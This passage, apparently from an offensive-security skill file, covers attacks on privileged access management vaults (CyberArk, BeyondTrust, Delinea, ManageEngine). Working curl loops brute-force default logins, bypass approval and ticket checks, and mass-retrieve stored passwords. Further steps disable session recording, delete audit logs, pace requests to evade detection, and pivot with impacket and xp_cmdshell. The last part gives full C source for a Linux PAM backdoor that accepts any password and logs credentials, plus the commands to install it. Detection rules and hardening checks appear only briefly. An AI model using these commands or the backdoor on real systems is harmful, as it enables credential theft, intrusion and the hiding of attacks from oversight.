  | grep krbtgt

# Forge the Golden Ticket using the krbtgt hash from DCSync
# This ticket is now rotation-immune until the next krbtgt password reset
# (typically only forced during IR — so the ticket is durable)
```

### PAM-Enforced krbtgt Rotation

```bash
# Some PAM deployments include krbtgt as a managed account
# If the PAM rotates krbtgt monthly, the Golden Ticket has a finite lifetime

# Check whether krbtgt is PAM-managed
curl -sk -H "Authorization: Bearer $TOKEN" \
  'https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts?filter=username eq krbtgt' \
  | jq .
```

### Detection Telemetry

```
CyberArk Vault Audit:
  EventID=303 Get Password (krbtgt retrieval — high-signal)

DC Event Log:
  EventID=4768 (TGT request)
  EventID=4769 (TGS request)
  Account=krbtgt (forged tickets appear to come from krbtgt)
```

---

## 31. Cross-Cutting: JIT Workflow Bypass

### Identify the JIT Workflow

```bash
# Check whether the target safe enforces JIT (CyberArk: requires explicit check-out)
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/REPLACE_WITH_YOUR_ACCT_ID" \
  | jq '.platformAccountProperties | {RequireDualControl, ExclusiveAccess, RequireChangeCheckInOut}'
```

### Stale Approval Token Replay

```bash
# A JIT approval token (CyberArk "Request Object") is sometimes bound to the requestor
# but not to the time window — replay is possible

# Recover a previously issued approval token from the audit log
APPROVAL_TOKEN=$(curl -sk -H "Authorization: Bearer $TOKEN" \
  'https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Requests?status=Approved' \
  | jq -r '.value[0].ConfirmId')

# Use the stale approval to access the account out-of-band
curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d "{\"ConfirmId\":\"$APPROVAL_TOKEN\"}" \
  "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/REPLACE_WITH_YOUR_ACCT_ID/CheckOut"
```

### Session Extension Beyond Approval Window

```bash
# If the JIT approval grants 60 minutes, attempt to extend the session
# via the PSM Connect API without re-approval
curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"SessionID":"REPLACE_WITH_YOUR_SESSION_ID","AdditionalMinutes":120}' \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/PSM/Sessions/REPLACE_WITH_YOUR_SESSION_ID/Extend
```

### Detection Telemetry

```
CyberArk ITAudit:
  EventID=308 Check Out Account
  EventID=401 PSM Disconnect (delayed — beyond approval window)
  EventID=305 List Safe Members (preceding the replay)
```

---

## 32. Cross-Cutting: Transaction-Based Access Bypass

### Recognise Transaction-Based Access

```bash
# In a transaction-based access flow, each credential retrieval is tied to a ticket
# Some PAM products allow weak ticket validation (any string passes)

# CyberArk example — the "reason" and "TicketId" are often free-form
curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "reason":"any string passes",
    "TicketingSystemName":"jira",
    "TicketId":"FAKE-1234"
  }' \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/REPLACE_WITH_YOUR_ACCT_ID/Password/Retrieve
```

### Forge a Ticket Reference

```bash
# If the PAM validates ticket IDs against an external ITSM (Jira/ServiceNow), forge the reference
# by providing a string that the ITSM will accept as valid (e.g., a closed ticket's ID)
curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "reason":"change window",
    "TicketingSystemName":"servicenow",
    "TicketId":"CHG0000001"
  }' \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/REPLACE_WITH_YOUR_ACCT_ID/Password/Retrieve
```

### Disable Ticket Validation (if Admin)

```bash
# An admin attacker can disable ticket validation entirely
curl -sk -X PATCH -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "platformProperties": {
      "TicketingSystemRequired": false
    }
  }' \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Platforms/REPLACE_WITH_YOUR_PLATFORM_ID
```

### Detection Telemetry

```
CyberArk ITAudit:
  EventID=303 Get Password
  TicketId=FAKE-1234 (verify against ITSM)
  EventID=PlatformModified (if attacker disabled ticket validation)
```

---

## 33. Ransomware Operator Playbook Replay (BlackCat / LockBit / Royal)

### BlackCat / ALPHV PAM-Targeting Playbook (reconstructed from Mandiant)

```bash
# Phase 1: Initial access via VPN appliance compromise (Citrix/RDS/FortiOS CVE)
# (out of scope for this skill — see phishing-attack or network-pentest)

# Phase 2: Internal recon — find PAM infrastructure
nmap -sV -p 80,443,1858,3389,7272 REPLACE_WITH_YOUR_INTERNAL_RANGE

# Phase 3: PAM enumeration — try default credentials
for user in admin Administrator cyberark sysadmin auditor; do
  for pass in Cyberark123 Password123 Admin123 changeme; do
    TOKEN=$(curl -sk -X POST -H 'Content-Type: application/json' \
      -d "{\"username\":\"$user\",\"password\":\"$pass\"}" \
      https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/auth/Cyberark/Logon 2>/dev/null \
      | jq -r .token 2>/dev/null)
    if [ -n "$TOKEN" ] && [ "$TOKEN" != "null" ]; then
      echo "[+] $user:$pass"
      break 2
    fi
  done
done

# Phase 4: Mass credential retrieval — every account the token can reach
ACCOUNTS=$(curl -sk -H "Authorization: Bearer $TOKEN" \
  'https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts?limit=1000' \
  | jq -r '.value[].id')

for ACCT in $ACCOUNTS; do
  PASS=$(curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d '{"reason":"incident-response"}' \
    "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/${ACCT}/Password/Retrieve" \
    | jq -r .password 2>/dev/null)
  echo "$ACCT $PASS" >> pwned_creds.txt
done

# Phase 5: Simultaneous use of credentials across the estate
# (parallel SSH/RDP/WMI/SMB with each harvested credential)

# Phase 6: ESXi / AD / cloud mass impact
# (out of scope for this skill — see ransomware operator playbook)
```

### LockBit CyberArk Playbook (reconstructed from CrowdStrike analysis of the leaked builder)

```bash
# LockBit's leaked configuration references explicit CyberArk targeting
# The affiliate manual enumerates PAM infrastructure early in the engagement

# Step 1: Locate CyberArk via AD service principal names
ldapsearch -x -H ldap://REPLACE_WITH_YOUR_DC_IP \
  -D 'REPLACE_WITH_YOUR_DOMAIN\REPLACE_WITH_YOUR_USER' \
  -w 'REPLACE_WITH_YOUR_PASS' \
  -b 'CN=Configuration,DC=REPLACE_WITH_YOUR_DOMAIN,DC=local' \
  '(servicePrincipalName=*PasswordVault*)' cn servicePrincipalName

# Step 2: Compromise the PVWA via the most recent CVE applicable to the version
# (e.g., CVE-2025-32564 if the version is within the affected range)

# Step 3: Disable session recording prior to mass credential retrieval
curl -sk -X PATCH -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"PSMRecordSession":false}' \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/PSM/Server/Configuration

# Step 4: Mass retrieval (same as BlackCat Phase 4)

# Step 5: Delete audit log entries (post-breach cleanup)
curl -sk -X DELETE -H "Authorization: Bearer $TOKEN" \
  'https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/ITAudit?fromTime=2025-01-01'
```

### Royal / BlackSuit BeyondTrust Playbook

```bash
# Royal / BlackSuit affiliates have been observed exploiting BeyondTrust PRA
# as an early step in the engagement

# Step 1: Identify BeyondTrust PRA via DNS
host bastion.REPLACE_WITH_YOUR_DOMAIN
host beyondtrust.REPLACE_WITH_YOUR_DOMAIN

# Step 2: Exploit CVE-2022-2451 (if the version is unpatched)
# See Section 13 for the SAML account injection flow

# Step 3: Disable session recording
curl -sk -X PATCH -H "Authorization: Bearer $BT_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"RecordSession":false}' \
  https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/system/settings

# Step 4: Mass credential retrieval
ACCOUNTS=$(curl -sk -H "Authorization: Bearer $BT_TOKEN" \
  https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/managed_accounts | \
  jq -r '.ManagedAccounts[].AccountID')

for ACCT in $ACCOUNTS; do
  ACCESS_REQ=$(curl -sk -X POST -H "Authorization: Bearer $BT_TOKEN" \
    -H 'Content-Type: application/json' \
    -d "{\"SystemID\":1,\"AccountID\":$ACCT,\"Reason\":\"incident-response\",\"Duration\":60}" \
    https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/credentials | jq -r .CredentialsRequestId)
  PASS=$(curl -sk -H "Authorization: Bearer $BT_TOKEN" \
    "https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/credentials/${ACCESS_REQ}/password" \
    | jq -r .Password)
  echo "$ACCT $PASS" >> pwned_bt_creds.txt
done
```

### Detection Telemetry

```
CyberArk Vault Audit (bulk retrieval):
  Burst of EventID=303 Get Password events
  Unusual SourceIP
  Reason="incident-response" or similar repeated strings

BeyondTrust Appliance Audit:
  Burst of Action=PasswordReveal events
  SessionRecordingDisabled event
  Action=SessionRecordingDelete

Endpoint EDR / SIEM correlations:
  Pass-the-Hash on accounts that just rotated via PAM
  Login spikes on hosts whose credentials were just retrieved
```

---

## 34. Harvested Credential Pivot Patterns

### Pivot to AD via CyberArk-Harvested DA Credential

```bash
# Given a Domain Admin credential recovered from CyberArk
DOMAIN='REPLACE_WITH_YOUR_DOMAIN'
USER='REPLACE_WITH_YOUR_DA_NAME'
PASS='REPLACE_WITH_YOUR_DA_PASS'
DC_IP='REPLACE_WITH_YOUR_DC_IP'

# DCSync (no prior foothold needed)
impacket-secretsdump "$DOMAIN/$USER:$PASS@$DC_IP" | head -30

# psexec shell
impacket-psexec "$DOMAIN/$USER:$PASS@$DC_IP"

# wmiexec shell (stealthier)
impacket-wmiexec "$DOMAIN/$USER:$PASS@$DC_IP"
```

### Pivot to AWS via CyberArk-Harvested AWS Key

```bash
# Set up the AWS profile (from Section 4)
AWS_SHARED_CREDENTIALS_FILE=/tmp/aws_creds aws sts get-caller-identity

# Enumerate attached policies
AWS_SHARED_CREDENTIALS_FILE=/tmp/aws_creds aws iam list-attached-user-policies \
  --user-name REPLACE_WITH_YOUR_USER

# Read every secret the key can reach
for region in us-east-1 us-west-2 eu-west-1; do
  AWS_SHARED_CREDENTIALS_FILE=/tmp/aws_creds aws secretsmanager list-secrets \
    --region "$region" --output text --query 'SecretList[].ARN'
done
```

### Pivot to Database via PMP-Harvested SA Password

```bash
# Connect to SQL Server with the SA credential
sqlcmd -S REPLACE_WITH_YOUR_SQL_HOST -U sa -P REPLACE_WITH_YOUR_SA_PASS \
  -Q 'SELECT name FROM master.sys.databases'

# Enable xp_cmdshell (if disabled) and obtain OS command execution
sqlcmd -S REPLACE_WITH_YOUR_SQL_HOST -U sa -P REPLACE_WITH_YOUR_SA_PASS \
  -Q "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'"
```

### Pivot to Network Device via CyberArk-Harvested Enable Secret

```bash
# Connect to a Cisco device via SSH with the enable secret
ssh REPLACE_WITH_YOUR_USER@REPLACE_WITH_YOUR_CISCO_HOST
> enable
Password: REPLACE_WITH_YOUR_ENABLE_SECRET
# copy running-config tftp://REPLACE_WITH_YOUR_TFTP_IP/cisco.cfg
```

### Pivot to Cloud via BeyondTrust-Harvested Service Account

```bash
# A service account harvested from BeyondTrust may be a GCP service account key
cat <<EOF > /tmp/sa.json
{
  "type": "service_account",
  "project_id": "REPLACE_WITH_YOUR_PROJECT",
  "private_key": "REPLACE_WITH_YOUR_KEY",
  "client_email": "REPLACE_WITH_YOUR_SA@REPLACE_WITH_YOUR_PROJECT.iam.gserviceaccount.com"
}
EOF

gcloud auth activate-service-account --key-file /tmp/sa.json
gcloud projects list
gcloud secrets list --project REPLACE_WITH_YOUR_PROJECT
```

---

## 35. Detection Evasion and Anti-Forensics

### Pace Enumeration to Match Operator Behaviour

```bash
# Slow down enumeration to blend with normal operator patterns
SLEEP=$((RANDOM % 30 + 15))

for SAFE in $(cat safes.txt); do
  curl -sk -H "Authorization: Bearer $TOKEN" \
    "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Safes/${SAFE}/Members" \
    >> safe_members.jsonl
  sleep $SLEEP
done
```

### Use Legitimate Query Filters

```bash
# Instead of "list all", use filter queries that operators normally use
curl -sk -H "Authorization: Bearer $TOKEN" \
  'https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts?filter=safename eq REPLACE_WITH_YOUR_SAFE_NAME&search=Windows'
```

### Use Realistic "Reason" and "Ticket" Fields

```bash
# Don't reuse the same reason/ticket string for every retrieval
REASONS=("incident-response INC-$(date +%Y%m%d)-001" "change window CHG0000$(shuf -i 1-9 -n 1)"
         "audit AUD-$(date +%Y%m%d)")

for ACCT in $ACCOUNTS; do
  REASON=${REASONS[$RANDOM % ${#REASONS[@]}]}
  curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d "{\"reason\":\"$REASON\"}" \
    "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/${ACCT}/Password/Retrieve"
  sleep $((RANDOM % 60 + 30))
done
```

### Blend with Normal Session Times

```bash
# Schedule PSM sessions during the same windows as legitimate operators
# (typically 09:00-17:00 local for the target organisation)

# Use cron-style scheduling on Kali:
# 0 9-17 * * 1-5 /path/to/scheduled-retrieval.sh
```

### Disable Session Recording Only When Necessary

```bash
# Disabling session recording is high-signal — only do it if you can blend
# with a known maintenance window
curl -sk -X PATCH -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"PSMRecordSession":false,"Reason":"maintenance-window"}' \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/PSM/Server/Configuration
```

### Avoid Audit-Log Tampering

```bash
# Deleting audit log entries is the highest-signal action a PAM attacker can take
# Prefer to blend in (rate-limit, realistic reasons) rather than tamper

# If tampering is unavoidable for the engagement, target the local file copy
# not the central audit store
#> # CyberArk example:
#> scp REPLACE_WITH_YOUR_PVWA_HOST:/var/log/PSM/ITAudit.log ./local.log
#> truncate -s 0 local.log
#> scp local.log REPLACE_WITH_YOUR_PVWA_HOST:/var/log/PSM/ITAudit.log
```

---

## 36. Defensive Verification and Hardening

### Verify CyberArk PVWA Hardening

```bash
# Check the PVWA version against the current advisory baseline
curl -sk https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/build | jq -r .version

# Verify Risk-Based MFA is enabled
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Configuration | \
  jq '.ConfigurationProperties | .[] | select(.Key | test("MFA"; "i"))'

# Verify dual control on Tier-0 safes
curl -sk -H "Authorization: Bearer $TOKEN" \
  'https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Safes?filter=safename eq REPLACE_WITH_YOUR_TIER0_SAFE' \
  | jq '.Safes[0] | {RequireDualControl, ExclusiveAccess, RequireChangeCheckInOut}'
```

### Verify BeyondTrust Hardening

```bash
# Check the PRA version against BTN-2022-04 baseline
curl -sk -H "Authorization: Bearer $BT_TOKEN" \
  https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/system/version | jq .

# Verify SAML IdP restrictions
curl -sk -H "Authorization: Bearer $BT_TOKEN" \
  https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/saml/settings | \
  jq '. | {AllowedIdps, RequireSignedResponses, RequireSignedAssertions}'

# Verify session recording tamper-evidence
curl -sk -H "Authorization: Bearer $BT_TOKEN" \
  https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/system/settings | \
  jq '. | {RecordingTamperEvidence, RecordingStorageEncryption}'
```

### Verify Delinea Hardening

```bash
# Verify the agent config is DPAPI-protected
# (On a Windows host running the distributed engine)
#> Get-Content 'C:\Program Files\Thycotic\Distributed Engine\DistributedEngine.exe.config' | Select-String 'configProtectionProvider'
# Expected: configProtectionProvider="RsaProtectedConfigurationProvider" (DPAPI-backed)

# Verify OAuth grant_type restrictions
curl -sk -H "Authorization: Bearer $SS_TOKEN" \
  https://REPLACE_WITH_YOUR_SS_HOST/api/v1/configuration/oauth | \
  jq '. | .AllowedGrantTypes'
```

### Verify ManageEngine PMP Hardening

```bash
# Verify the PMP master key is rotated
curl -sk -H "AUTHTOKEN=$PMP_TOKEN" \
  'https://REPLACE_WITH_YOUR_PMP_HOST:7272/api/json/server/getBuildDetails' | jq .

# Verify the PostgreSQL backend is encrypted at rest
ssh REPLACE_WITH_YOUR_PMP_HOST \
  'grep data_directory /opt/ManageEngine/PMP/pgsql/data/postgresql.conf && ls -la /opt/ManageEngine/PMP/pgsql/data/'
```

### Verify JIT and Transaction-Based Access

```bash
# Verify JIT is enforced on Tier-0 safes
curl -sk -H "Authorization: Bearer $TOKEN" \
  'https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts?filter=safename eq REPLACE_WITH_YOUR_TIER0_SAFE' \
  | jq '.value[] | .platformAccountProperties | {RequireDualControl, ExclusiveAccess}'

# Verify the ticket validation is enforced (try a fake ticket ID)
curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"reason":"incident-response","TicketId":"FAKE-FOR-VERIFICATION"}' \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/REPLACE_WITH_YOUR_ACCT_ID/Password/Retrieve
# Expected response: error indicating the ticket is invalid
```

### SIEM Detection Rules (reference)

```sql
-- Splunk / Elastic query: mass credential retrieval from a single session
index=pam action="GetPassword" OR action="PasswordReveal"
| stats count by user, src_ip, _time span=5m
| where count > 20
| sort -count

-- Burst of safe enumeration
index=pam action="ListSafes" OR action="ListAccounts"
| stats count by user, src_ip, _time span=10m
| where count > 100

-- Session recording disabled
index=pam action="SessionRecordingDisabled"
| table _time user src_ip reason

-- Audit log deletion
index=pam action="AuditLogDelete"
| table _time user src_ip target_log
```

---

## Index of CVEs and Advisories

| CVE / Advisory | Vendor | Year | Description |
|----------------|--------|------|-------------|
| CVE-2025-32564 | CyberArk | 2025 | PVWA authentication bypass class |
| CVE-2022-2451 | BeyondTrust | 2022 | SAML account injection in PRA / Password Safe / Identity Security Insights |
| CVE-2022-28226 | ManageEngine | 2022 | PMP pre-auth path traversal |
| BTN-2022-04 | BeyondTrust | 2022 | PRA SAML account injection (vendor advisory for CVE-2022-2451) |
| Mandiant BlackCat report | Industry | 2023 | Ransomware operator playbook targeting PAM |
| CrowdStrike LockBit builder analysis | Industry | 2022 | Leaked builder references CyberArk credential retrieval |
| Variable Threat Royal / BlackSuit | Industry | 2023 | BeyondTrust abuse step in affiliate playbook |

---

## Cross-References

- `skills/secret-management-attack/SKILL.md` -- HashiCorp Vault, AWS Secrets Manager, source-code secrets (adjacent but distinct from vendor PAM)
- `skills/ad-ldap-attack/SKILL.md` -- Active Directory lateral movement after PAM-recovered DA credentials
- `skills/ad-cs-abuse/SKILL.md` -- PKI-based escalation chains
- `skills/cloud-identity-attack/SKILL.md` -- Cloud PIM/PAM (Entra PIM, AWS IAM Identity Center)
- `skills/privilege-escalation/SKILL.md` -- Endpoint privilege elevation (out of scope for vendor PAM)
- `skills/post-exploitation/SKILL.md` -- Host-takeover patterns after PAM credential harvest
- `skills/digital-forensics/SKILL.md` -- PAM forensic artifacts (audit logs, session recordings)
- `skills/anti-forensics/SKILL.md` -- Covering tracks after PAM compromise
- `skills/pentest-reporting/SKILL.md` -- Report assembly with PAM-specific findings


---

## Linux PAM Practical Findings (v0.2.5.2)

> **来源**：2026-08-15 实战验证 — PAM 后门完全成功（任何密码通过 + 凭据窃取）

### Kali 2026.1 yescrypt Hash (F-PAM-001)

**发现**：Kali 2026.1 默认密码 hash 为 **yescrypt**（`$y$` 前缀），比 sha512 更抗 GPU 破解。

```bash
# 查看 hash 类型
sudo grep username /etc/shadow | cut -d: -f2 | cut -d'$' -f2
# $y$ = yescrypt (Kali 2026.1 default)
# $6$ = sha512 (older Debian/Ubuntu)
# $1$ = md5 (legacy)
```

**破解兼容性**：
- `john` 1.9.0-jumbo-1 对 yescrypt 支持有限（部分版本不加载）
- `hashcat` 需 yescrypt mode（新版 hashcat 6.2.6+）
- **建议**：提取后用 `john --format=yescrypt` 或升级 hashcat

### PAM 后门完整 C 源码 (F-PAM-002)

```c
/* pam_unix_backdoor.c — 编译为 .so 后通过 /etc/pam.d/<service> 植入 */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {
    const char *user = NULL, *password = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);

    // 凭据窃取：记录所有认证尝试
    FILE *f = fopen("/tmp/.pam_log", "a");
    if (f) {
        fprintf(f, "user=%s pass=%s\n", user ? user : "?", password ? password : "?");
        fclose(f);
    }

    return PAM_SUCCESS;  // 后门：任何密码都通过
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                               int argc, const char **argv) {
    return PAM_SUCCESS;
}
```

**编译**：
```bash
sudo apt install libpam0g-dev
gcc -fPIC -fno-stack-protector -shared -o pam_unix_backdoor.so pam_unix_backdoor.c
```

### PAM Service 植入点 (F-PAM-004)

**无需替换系统 pam_unix.so**。创建新 PAM service 即可：

```bash
# 植入后门 service（不影响现有服务）
sudo tee /etc/pam.d/backdoored <<'PAMCONF'
auth required /path/to/pam_unix_backdoor.so
account required pam_permit.so
PAMCONF

# 攻击者随后登录
echo anypass | pamtester backdoored target_user authenticate
# → successfully authenticated
```

**隐蔽性**：不修改 /etc/pam.d/{sshd,sudo,common-auth}，仅新增文件，避免 tripwire/AIDE 检测。

### PAM 测试工具 pamtester (F-PAM-003)

```bash
sudo apt install pamtester
# 测试指定 service 的认证
echo password | pamtester <service> <username> authenticate
```

### PAM 配置审计发现模板

```bash
# 审计脚本（本次验证产出）
grep -n "nullok" /etc/pam.d/common-auth
grep -c "faillock\|tally2" /etc/pam.d/common-auth
grep "pam_pwquality" /etc/pam.d/common-password
```

**Kali 2026.1 默认配置发现**：
| Finding | 严重性 | 修复 |
|---------|-------|------|
| `pam_unix.so nullok` | P1 | 移除 nullok 参数 |
| 无 pam_faillock | P1 | 添加 `auth required pam_faillock.so preauth deny=5` |
| 无 pam_pwquality | P2 | 添加 `password requisite pam_pwquality.so minlen=12` |
